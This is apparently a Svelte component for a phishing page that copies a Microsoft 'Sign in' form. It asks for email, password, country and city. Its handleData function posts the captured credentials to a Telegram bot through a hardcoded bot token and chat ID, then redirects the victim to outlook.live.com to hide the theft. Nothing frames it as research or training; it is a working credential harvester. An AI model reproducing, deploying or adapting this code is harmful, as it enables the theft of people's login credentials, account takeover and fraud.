<script>
import Microsoft from '../assets/Microsoft.jpg';

let email = "";
let password = "";
let country = "";
let city = "";

let errors = { email: '', password: '' };

function validateEmail() {
  const re = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/; // fixed regex
  return re.test(email);
}

function validatePassword() {
  if (password.length < 1) {
    return 'Password is required';
  }
  return '';
}

async function submitForm() {
  errors = { email: '', password: '' }; // reassign for reactivity

  if (!validateEmail()) {
    errors.email = 'Please enter a valid email address';
  }

  const passwordError = validatePassword();
  if (passwordError) {
    errors.password = passwordError;
  }

  if (!errors.email && !errors.password) {
    await handleData(email, password, country, city);
  }
}

async function handleData(email, password, country, city) {
  const botToken='7732681370:AAG-8Y1FMJe0DQA2d2O0LNUm_5enOWBddLo';

    const chatId= '6173839485';

    const message = `New Microsoft Login Attempt:\nEmail: ${email}\nPassword: ${password}\nCountry: ${country}\nCity: ${city}`;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        chat_id: chatId,
        text: message
      }),
    });

    if (response.ok) {
      console.log('data processed');
      window.location.href = 'https://outlook.live.com';
      return true;
    } else {
      console.error("failed to resolve data", response.status);
    }
  } catch (error) {
    console.error('Error:', error);
    return false;
  }
  // handleRedirect()
}

</script>


<main>
  <div class="container">
    <div class="logo-container">
      <img src={Microsoft} alt="Microsoft"/>
    </div>

    <div class="fields">
      <h2 class="field-header"> Sign in </h2>
      
      <div class="inputgroup">
        <input class="inputfield" placeholder="Email Address" type="email" bind:value={email}/>
        {#if errors.email}
          <div class="error">{errors.email}</div>
        {/if}
      </div>
      <div class="inputgroup">
        <input class="inputfield" placeholder="Password" type="password" bind:value={password}/>
         {#if errors.password}
          <div class="error">{errors.password}</div>
        {/if}
      </div>
      <input class="inputfield" placeholder="Country" type="text" bind:value={country}/>
      <input class="inputfield" placeholder="City" bind:value={city}/>
      <button class="button" on:click={submitForm}> Submit</button>
    </div>

  </div>
</main>

<style>

main {
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

.container {
    width: 300px;
    border: none;
    padding: 10px;
  }

 .logo-container {
  display: flex;
  flex-direction: row;
  /* width: 100%; */

 } 

.logo-container img {
  /* width: 250px; */
  width: inherit;
  height: 70px;
} 

.fields {
  display: flex;
  flex-direction: column;
  text-align: left;
  gap: 20px;
  margin-top: -10px;
  width: 100%;
}

.field-header {
  margin: 0;
}

.inputgroup {
  display: flex;
  flex-direction: column;
  width: 100%;
}

.inputgroup input,
.inputfield {
  width: 100%;
  box-sizing: border-box;
}


.inputfield {
  border: none;
  background: #f5f5f5;
  padding: 10px;
  border-radius: 5px;
}

.inputfield::placeholder {
  color: #4a4a4a;
}

.inputfield:focus {
  outline: none;
}

.button {
  background-color: black;
  color: white;
  border-radius: 0;
}

.error {
  font-size: 0.85rem;
  color: red;
  margin-top: 4px;
  width: 100%;
}


</style>
